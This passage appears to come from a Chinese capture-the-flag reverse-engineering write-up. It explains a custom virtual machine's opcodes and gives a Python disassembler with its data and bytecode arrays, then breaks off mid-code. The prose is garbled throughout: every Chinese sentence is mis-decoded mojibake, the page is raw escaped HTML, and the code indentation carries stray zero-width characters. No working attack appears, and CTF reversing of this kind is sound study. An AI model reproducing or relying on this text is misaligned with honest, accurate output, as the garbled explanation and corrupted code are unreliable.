ˆæ“ä½œçš„ç‰¹å¾ï¼Œæ‰€ä»¥æ­¤å¤„æ˜¯ pushï¼Œè€Œ unknown2 [0] æˆ‘ä»¬ä¹Ÿå¯ä»¥ç¡®å®šæ˜¯ rsp</p>\n<p>æ ¹æ®åˆ†æè¿‡ç¨‹å®Œå–„å®šä¹‰çš„ vm ç»“æ„ä½“</p>\n<p><img data-src=\"/images/image-20230213181923702.png\" alt=\"image.png\"></p>\n<p>(zf æ ‡å¿—å¯„å­˜å™¨ï¼Œç”¨ 0 å’Œ 1 è®°å½•è®¡ç®—ç»“æœ)</p>\n<p><img data-src=\"/images/image-20230213182227616.png\" alt=\"image.png\"></p>\n<p>å†çœ‹åé¢çš„å°±å¾ˆæ¸…æ™°äº† case2 ä¸º pop å‡ºæ ˆ</p>\n<p><img data-src=\"/images/image-20230213182403514.png\" alt=\"image.png\"></p>\n<p>case3 ä¸ºè¿›è¡Œè¿ç®—çš„æ“ä½œ ï¼ˆwp ç›´æ¥ç”¨ alu æ¦‚æ‹¬äº†)</p>\n<p><img data-src=\"/images/image-20230213182731775.png\" alt=\"image.png\"></p>\n<p>case4 æ˜¯ cmp æ¯”è¾ƒ zf å¯„å­˜å™¨è®°å½•ç»“æœ</p>\n<p><img data-src=\"/images/image-20230213182909882.png\" alt=\"image.png\"></p>\n<p>case5 æ˜¯è·³è½¬ jmp</p>\n<p><img data-src=\"/images/image-20230213182952253.png\" alt=\"image.png\"></p>\n<p>case6 æ˜¯ jne ä¸ç›¸ç­‰è·³è½¬ (å·¦æ“ä½œæ•°â‰ å³æ“ä½œæ•°)</p>\n<p><img data-src=\"/images/image-20230213183618015.png\" alt=\"image.png\"></p>\n<p>case7 æ˜¯ je ç›¸ç­‰è·³è½¬ (å·¦æ“ä½œæ•° = å³æ“ä½œæ•°)</p>\n<p>lazy IDA æå–å‡º data (input) å’Œå­—èŠ‚ç æ•°ç»„ å†™åæ±‡ç¼–å™¨æŠŠç¨‹åºè½¬æ¢ä¸ºæ±‡ç¼–è¯­è¨€</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>data<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">155</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188</span><span class=\"token punctuation\">,</span> <span class=\"token number\">172</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">206</span><span class=\"token punctuation\">,</span> <span class=\"token number\">250</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">232</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">203</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">252</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">214</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">191</span><span class=\"token punctuation\">,</span> <span class=\"token number\">232</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">139</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">194</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">245</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">193</span><span class=\"token punctuation\">,</span> <span class=\"token number\">94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">237</span><span class=\"token punctuation\">,</span> <span class=\"token number\">176</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">253</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">139</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">219</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">143</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18432</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61696</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16384</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8448</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13569</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token number\">25600</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30721</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63744</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20992</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9472</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23809</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18176</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64768</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26881</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23552</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">44801</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45568</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60417</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20993</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20225</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20480</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34049</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52480</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8960</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63488</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token number\">3072</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52992</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15617</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17665</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33280</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53761</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54529</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1537</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41473</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56832</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token number\">42497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51713</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>code<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>ip<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mov</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov reg[0],data[reg[2]]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov data[reg[2]],reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mov reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>â€‹    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>â€‹        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mov reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token 